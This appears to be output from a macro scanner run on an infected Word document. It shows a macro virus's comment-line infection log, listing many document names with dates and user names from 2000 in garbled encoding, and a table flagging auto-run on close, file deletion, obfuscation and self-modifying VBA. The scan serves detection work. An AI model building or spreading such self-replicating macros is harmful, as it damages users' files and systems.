' 2.doc

' 10:28:29 AM -Monday,10 Apr,2000
' ПД·Ж
'
' »ШО¶Ў¶УєХэ»КµЫЎ·.doc

' ОТГЗК§ВдБЛКІГґ.doc

' LJSEXXYI.doc

' LJSEXXYI.doc

' №ШУЪ№«ЛѕТµОсИЛФ±ПъКЫј°Ѕ±АшКФРР°м·Ё.doc

' ЦЬ№ИіЗПИЙъµДЦРОчОД»Ї№Ы.doc

' ґуФєµД№ККВ.doc

' 1.doc

' ОДµµ1

' 1.doc

' ОДµµ1

' x1.doc

' Е¦ФјЎ°ЦР№ъОД»ЇЙМГііЗЎ±·Ѕ°ё.doc

' 09:36:48 PM -Thursday,13 Apr,2000
' ОєАцѕь
'
' Е¦ФјЎ°ЦР№ъОД»ЇЙМГііЗЎ±·Ѕ°ё.doc

' №«ЛѕПоДї.doc

' 11:29:30 AM -Friday,14 Apr,2000
' ХЕїЎ
'
' №«ЛѕПоДї.doc

' ґ«Хжa.doc

' POEMS.doc

' SONGS.doc

' ґ«ХжУГЦЅ.doc

' ґ«Хж.doc

' SHNEW.DOC

' РВЅЁ Microsoft Word ОДµµ.doc

' ОДµµ1

' ОДµµ1

' ОДµµ1

' ¶Ш»НХ№Рыґ«НЖ№гјЖ»®.doc

' 1.doc

' ¶Ш»НКЇїЯТХКхХ№РВОЕёе.doc

' ¶Ш»НТХКхХ№РВОЕёе.doc

' ¶Ш»НХ№НјЖ¬ЛµГч.doc

' »бјЖЦЖ¶И.doc

' ВнЅЎЕа.doc

' ОДµµ2

' ¶Ш»НТХКхХ№Рыґ«НЖ№г·СФ¤Лг.doc

' ЧвБЮєПН¬.doc

' ОДµµ3

' ОДµµ2

' Р­ТйКй1.doc

' Р­Тй1.doc

' ОДјю001.doc

' ЦР№ъ¶Ш»Нёе.doc

' СыЗлєЇ.doc

' РВЅЁ Microsoft Word ОДµµ.doc

' КФВЫЅЇНўОэ.doc

' НтДЬГыЖ¬.doc

' JL.doc

' 08:07:11 PM -Wednesday,21 Jun,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' JL.doc

' Cjl-jl.doc

' јтАъ.doc

' ёц ИЛјт Аъ.doc

' јтАъ2ЈЁУўЈ©.doc

' јтАъ2.doc

' јтАъ(1).doc

' ёц   ИЛ   јт   Аъ.doc

' ёцИЛјтАъ(1).doc

' ёцИЛјтАъ(2).doc

' ¶­СУ.doc

' ЗуЦ°єЇ.DOC

' ІМ±х.doc

' ¶«Ії»ЇС§-єЪ-СЇјЫ.doc

' АЦСА-СЇјЫ.doc

' Doc1.doc

' qxzd0617-2.doc

' qxzd0131-2.doc

' є«АЦМм5%ECКФСйїН»§ГыВј.doc

' µ¤¶«µШЗшє«АЦМмПъКЫµгј°Л®МпЗйїц.doc

' 2000TW-BM021.doc

' 2000TW-BM027.doc

' 11:02:09 AM -Tuesday,4 Jul,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' 2000TW-BM038.doc

' їН»§ГыВј.doc

' ZHANGYI.doc

' СЇјЫ-¶«Ії-єюДПі¤Йі.doc

' ZDCH003.doc

' СЇјЫ-¶«Ії-ЙсЕ©Н­ЙЅ.doc

' ОДµµ1

' іцІо±Ёёж05.doc

' ОДµµ1

' №¤ЧчИХјЗ.doc

' СЇјЫ-ёЯУКФ¶¶«.doc

' УтГыЧўІбєПН¬Кй.doc

' УтГы№ЬАнГыВј.doc

' ё¶їоПъКЫЗйїц.doc

' 2000TW-BM002.doc

' 2000TW-BM034.doc

' 2000TW-BM006.doc

' 2000TW-BM001.doc

' ОДµµ1

' ОДµµ1

' zwlїмЅЭ.doc

' qxzd0003.doc

' qxzd0117-1.doc

' 2000TW-BM001.doc

' ОДµµ2.doc

' Ф­БПїН»§0.doc

' Ф­БПїН»§1.doc

' yp0004.doc

' 99АыТж.doc

' 2000YPWT-004.doc

' F1233.doc

' ZDCH004.doc

' іцІо±Ё00.doc

' РоµзіШФ­ІДБПїН»§ГыµҐ(ЙъІъі§јТ).doc

' ОДµµ1

' 2000TW-BM039.doc

' 2000TW-BM003.doc

' 2000TW-BM004.doc

' 2000TW-BM005.doc

' 2000TW-BM007.doc

' 2000TW-BM008.doc

' 2000TW-BM009.doc

' 2000TW-BM010.doc

' 2000TW-BM011.doc

' 2000TW-BM012.doc

' 2000TW-BM013.doc

' 2000TW-BM014.doc

' 2000TW-BM015.doc

' 2000TW-BM016.doc

' 2000TW-BM017.doc

' 2000TW-BM018.doc

' 2000TW-BM019.doc

' F1233.doc

' 2000TW-BM020.doc

' ОДµµ1

' 2000TW-BM021.doc

' 2000TW-BM020.doc

' 2000TW-BM022.doc

' 2000TW-BM023.doc

' 2000TW-BM024.doc

' 2000TW-BM025.doc

' 2000TW-BM026.doc

' 2000TW-BM027.doc

' 2000TW-BM028.doc

' 2000TW-BM031.doc

' 2000TW-BM032.doc

' 2000TW-BM035.doc

' 2000TW-BM036.doc

' 2000TW-BM037.doc

' 2000YPWT-001.doc

' 2000YPWT-002.doc

' qxzd0709-1.doc

' У¦   Жё.doc

' F1233.doc

' ґ«ХжёсКЅ2.doc

' 98'З¦ЛбРоµзіШРРТµ50ЗїЕЕГы.doc

' ХКєЕёжЦЄЈЁІЭЖєЈ©МміЙµзДФ.doc

' У¦   Жё.doc

' СЇјЫ-¶«Ії-єюДПєЈАыzhuzhou.doc

' qxzd0710-2.doc

' F1233(1).doc

' E20000517.doc

' RESUME(TaiweiBJ2t).doc

' jianlicstarwq(TaiweiBJ2t).doc

' ёцИЛјтЅй.doc

' РоµзіШФ­ІДБППоДї·ЦОц±Ёёж1.doc

' qxzd0711-1.doc

' qxzd0711-2.doc

' LG µзіШГЬ·вУГХієПјБ.doc

' yp0001.doc

' qxzd0711-2.doc

' qxzd0711-1.doc

' qxzd0712-1.doc

' јтАъZHR.doc

' qxzd0000.doc

' ПъКЫ·СУГ.doc

' ґ«ХжН·ЈЁЕ©Т©Ј©.doc

' qxzd0713.doc

' ґ«ХжН·ЈЁЕ©Т©Ј©1.doc

' 98№©БПГчПё.doc

' ЗуЦ°єЇ(1).DOC

' ZHANGYI(1).doc

' У¦   Жё(1).doc

' henry.doc

' job1.doc

' є«АЦМміЙ±ѕјЖЛг.doc

' є«АЦМміЙ±ѕјЖЛг.doc

' МмєПН¬јЄБЦ001.doc

' є«АЦМмё¶їоПъКЫЗйїц.doc

' є«АЦМм5%ПдЗ©.doc

' є«АЦМміЙ±ѕјЖЛг±н.doc

' ОДµµ1

' іцІојЖ»®3.doc

' ОДµµ1

' ADD.doc

' №«ЛѕјтЅй.doc

' JXC.DOC

' ЧФјц±н.doc

' ЧФјц±н1.doc

' ґ«ХжН·ЈЁЕ©Т©Ј©1.doc

' ХКїоёжЦЄ(М«РР).doc

' іцІо±Ёёж04.doc

' іцІо±Ёёж03.doc

' ОДµµ1

' ОДµµ2

' 2000є«АЦРЗјЄБЙПъКЫТ»АА±н01.doc

' ОДµµ1

' є«АЦМм·ЦЕд·Ѕ°ё01.doc

' є«АЦМмПъКЫё¶їоЗйїц.doc

' ІЖОсЅ»ЅУ.doc

' їН»§ГыВј.doc

' 99njingіцІо±Ёёж.doc

' XHW04.doc

' є«АЦРЗµДёРР»РЕ.doc

' JLIЗйїц-1.doc

' єЪБъ.doc

' XFZH98±ёНьВј.doc

' є«АЦРЗ98ДкµЧ°ІЕЕЈЁ FAXЙРі¤ВјЈ©.doc

' 2000№¤ЧчјЖ»®.doc

' 2000ДкіцІо±Ёёж01.doc

' 2000ДкіцІојЖ»®.doc

' іцІојЖ»®03.doc

' іцІојЖ»®.doc

' ОДµµ2.doc

' іцІо±Ёёж01.doc

' №¤ЧчЛјВ·.doc

' palmХЖЙПµзДФ±ЁјЫ.doc

' є«АЦМмКµСйР­Тй01.doc

' є«АЦМмКµСйР­Тй02.doc

' јЄБЦКФСй.doc

' µ¤¶«µШЗшє«АЦМмПъКЫµгј°Л®МпЗйїц.doc

' №гёж°ІЕЕ-2000БЙДю1.doc

' №гёж°ІЕЕ.doc

' 2000Дк№гёж°ІЕЕЗйїц.doc

' 2000є«АЦРЗєЪБъЅ­ПъКЫТ»АА±н01.doc

' є«АЦМм·ЦЕд·Ѕ°ё.doc

' ~WRD0002.tmp

' ОДµµ1

' cute.doc

' PRICE.DOC

' ОДµµ2

' 2000ДкНЁС¶Вј.doc

' №¤ЧчЅ»ЅУј°ЧЬЅб.doc

' М©О¬ЙМЙз.doc

' ОДµµ1

' НхѕэТг№¤Чч.doc

' ёцИЛјтАъ.doc

' 12:00:34 їАИД -Friday,1 Sep,2000
' Hanjung4
'
' АМ·Вј­.doc

' 0822.doc

' 0901.doc

'  мС  .doc

' є«№ъЦШ№¤ТµЦкКЅ»бЙзјтЅй.doc

' є«№ъЦШ№¤ТµЦкКЅ»бЙзјтЅй.doc

' 8їщєё°нј­.doc

' 0904.doc

' Зц±ЭјцЗҐ01.doc

' 0831.doc

' №®ј­1

' Вч·®±ёАФ.doc

' 0905.doc

' 0906.doc

' 08:39:13 їАИД -Thursday,7 Sep,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' 0906.doc

' ±ЩЕВєё°нј­.doc

' ЗПілАМБцБЎ є»»зєё°н (2).doc

' АПАПєё°н2 (2).doc

' facsimile(їµ№®).doc

' ґзБцБЎ ѕч№«єРАе.doc

' °жАп»зБ¤єёАФјц°ь·Г.doc

' »зАО»зїлЅЕГ»ј­.doc

' Г·єО--їмё®»зБЦ-Г»ѕа-ѕИі».doc

' АПАПєё°н2 (4).doc

' 00івГЯј®ї¬ИЮє№БцЅГјіїоїµ°иИ№.doc

' АПАП є»»зєё°н (9).doc

' АПАП є»»зєё°н (10).doc

' АПАП є»»зєё°н (11).doc

' Daily Report (9).doc

' Daily Report (9).doc

' 0915.doc

' 0917.doc

' АПАПєё°н2 (7).doc

' їмё®»зБЦГ»ѕа-±д±ЮЖДѕЗ.doc

' 0918 (1).doc

' 332-134.doc

' 332-131.doc

' 0920 (1).doc

' (±д±Ю)їмё®»зБЦБЦЅД№иБ¤ЗцИІ.doc

' ЗК±в2.doc

' 0921 (1).doc

' ЗК±в2.doc

' їмё®»зБЦ-°іАОє°-ГЦБѕ№иБ¤ЗцИІ.doc

' Daily Report (17).doc

' 0922 (1).doc

' ЗШїЬ±Юї©БЦјТ.doc

' АПАП є»»зєё°н (12).doc

' 0925 (1).doc

' АПАПєё°н2 (9).doc

' і»ї¬№ЯАьPM-єО°н(БшГ¶±Ф°ъАе-єОДЈ).doc

' єО°н(їшАЪ·ВQC-Б¤µїєО№ЭАе).doc

' ГјА°ґлИё°ь·Г-±ЩЕВ.doc

' DAILY REPORT (21).doc

' АПАПєё°н2 (12).doc

' 1005 (1).doc

' p.t hanjung.doc

' АПАП є»»зєё°н.doc

' 04:32:55 їАИД -Friday,6 Oct,2000
' ЗСБЯ
'
' АПАП є»»зєё°н.doc

' FAX(їµ№®).doc

' °­АОј·АЗїш-ЗСБЯDCM°сЗБИёїш±З(°жїµ°ьё®єО1009).doc

' Calculation of Tentative Price2.doc

' є°Г· 1,3 Calculation of Tentative Price2.doc

' Final Draft_ HFControls ѕч№«БшЗа»уИІєё°н.doc

' јј±Э°и»кј­АФ±ЭЗҐГ»±ёј­.doc

' ґлїЬ°ш№®(±№№®.їцµе).doc

' ґлїЬ°ш№®2(±№№®.їцµе).doc

' АМАО±вАЗїш-ГвАЪИё»зє№єс№Ч АО°Зєс(1012).doc

' °ь°иИё»з °бјХ±Э №Я»э »зАЇ №Ч ґлГҐ(ЕхАЪјіёнИё0918).doc

' 2000±№Иёї№»уБъАЗґдєЇј­.doc

' 06:00:47 їАИД -Wednesday,18 Oct,2000
' ±иБ¤їА
'
' °жїµ°ьё®єО6.doc

' °жїµ°ьё®єО5.doc

' °жїµ°ьё®єО4.doc

' °жїµ°ьё®єО3.doc

' ГЦ±ЩЕхАЪєОБш(±и№жёІ-ї¬±ёБцїшєО).doc

' °жїµ°ьё®єО2.doc

' °жїµ°ьё®єО1.doc

' HSD ЅЕБЦ№ЯЗа(±№Иё).doc

' Зцґл АУґлАеєс(±№Иё).doc

' БшЗаБЯАО АпјЫ»зѕИ(±№Иё).doc

' »пјє °жѕч±ЭБц(±№Иё).doc

' ґлїм ѕоАЅ±Э(±№Иё).doc

' ёНЗь±Ф(°ш°шєО№®±ёБ¶Б¶Б¤)ЅЗЕВ.doc

' іЄёУБц SCHEDULE.doc

' №и±вїоАЗїш±№°Ё-і»ї¬№ЯАь.doc

' 001017-±№Б¤°Ё»зї№»у БъАЗ ґдєЇ(±вјъ°ьё®єО).doc

' 03:49:05 їАИД -Wednesday,18 Oct,2000
' АМГўИЖ
'
' 001017-±№Б¤°Ё»зї№»у БъАЗ ґдєЇ(±вјъ°ьё®єО).doc

' 001017-±№Б¤°Ё»зї№»у БъАЗ ґдєЇ.doc

' ИёАЗјТБэЕлєёј­.doc

' ±вјъ°ьё®єО.doc

' 10:01:36 їААь -Thursday,19 Oct,2000
' HANJUNG
'
' load_file.asp?id=2077&no=1

' єё°­beam.doc

' 02:02:30 їАИД -Monday,23 Oct,2000
' HANJUNG
'
' єё°­beam.doc

' load_file.asp?id=2109&no=1

' Аь»кѕч№«їдГ»ј­.doc

' 08:53:26 їААь -Monday,30 Oct,2000
' HANJUNG
'
' Аь»кѕч№«їдГ»ј­.doc

' load_file.asp?id=2145&no=1

' DrumRod.doc

' equivalent_tube.doc

' 11:36:57 їААь -Tuesday,31 Oct,2000
' HANJUNG
'
' equivalent_tube.doc

' hsintao(OMRF).doc

' 03:37:29 їАИД -Monday,6 Nov,2000
' HANJUNG
'
' hsintao.doc

' PRINTING.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

